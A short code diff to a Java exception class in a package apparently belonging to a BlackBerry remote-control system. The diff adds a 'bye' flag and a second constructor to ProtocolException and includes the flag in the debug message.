@@ -15,12 +15,20 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
  * l'esecuzione di un protocollo. Come effetto fa cadere la comunicazione.
  */
 public class ProtocolException extends Exception {
-	//#debug
+    //#debug
     static Debug debug = new Debug("ProtocolException", DebugLevel.VERBOSE);
 
+    public boolean bye;
+
     public ProtocolException(String string) {
+        this(string, false);
+
+    }
+
+    public ProtocolException(String string, boolean bye_) {
         super(string);
+        this.bye = bye_;
         // #debug
-        debug.error(string);
+        debug.error(string + " bye:" + bye_);
     }
 }
